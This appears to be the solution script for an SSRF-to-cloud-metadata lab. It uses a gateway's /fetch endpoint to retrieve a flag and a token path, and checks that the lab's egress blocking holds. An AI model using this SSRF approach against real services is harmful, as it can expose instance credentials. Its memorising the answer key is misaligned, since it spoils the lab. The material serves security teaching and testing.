"""Deterministic solution for the SSRF-to-metadata lab.

Offline (default) every fetch resolves through `fetch_offline` so flag recovery
and the egress assertions run with no network. Run against a live gateway with
``--url ROOT`` for the compose smoke path, where the lab/mock external host and
the internal bridge's default-deny egress are real.
"""
import sys
import urllib.error
import urllib.request

from challenge import (
    FLAG,
    external_url,
    fetch_offline,
    flag_in_iam,
    flag_url,
    token_url,
)


def _live_get(url_root: str, url: str) -> dict:
    import json

    body = json.dumps({"url": url}).encode()
    request = urllib.request.Request(
        url_root.rstrip("/") + "/fetch",
        data=body,
        method="POST",
        headers={"Content-Type": "application/json"},
    )
    try:
        with urllib.request.urlopen(request, timeout=6) as response:
            return json.loads(response.read().decode())
    except urllib.error.HTTPError as error:
        return {"error": f"http {error.code}"}


def _assert_no_flag(label: str, body: str) -> None:
    if FLAG in body:
        raise AssertionError(f"network-negative failure: flag leaked via {label}: {body!r}")


def run_offline() -> str:
    """Recover the flag offline and assert the egress contract. Returns the flag."""
    status, body = fetch_offline(flag_url())
    text = body.decode()
    if status != 200 or flag_in_iam().upper() not in text:
        raise ValueError(f"offline flag recovery failed: {status} {text!r}")

    token_status, _ = fetch_offline(token_url())
    if token_status != 200:
        raise ValueError(f"offline token path not served: {token_status}")

    # Network-negative: the non-metadata external host must not leak the flag.
    ext_status, ext_body = fetch_offline(external_url())
    _assert_no_flag("external host", ext_body.decode("utf-8", "replace"))
    return FLAG


def run_live(url_root: str) -> str:
    """Recover the flag through a live gateway and assert the egress contract."""
    captured = _live_get(url_root, flag_url())
    if "error" in captured or flag_in_iam().upper() not in str(captured.get("body", "")):
        raise ValueError(f"live flag recovery failed: {captured!r}")

    ext = _live_get(url_root, external_url())
    if "error" in ext:
        raise ValueError(f"live external host errored: {ext!r}")
    _assert_no_flag("external host", str(ext.get("body", "")))
    return FLAG


if __name__ == "__main__":
    url_root: str | None = None
    args = iter(sys.argv[1:])
    for arg in args:
        if arg == "--url":
            url_root = next(args)
        elif arg.startswith("--url="):
            url_root = arg.split("=", 1)[1]
        else:
            raise SystemExit(f"unknown argument: {arg}")
    result = run_live(url_root) if url_root else run_offline()
    assert result == FLAG, "recovered flag does not match the committed lab constant"
    print(result)
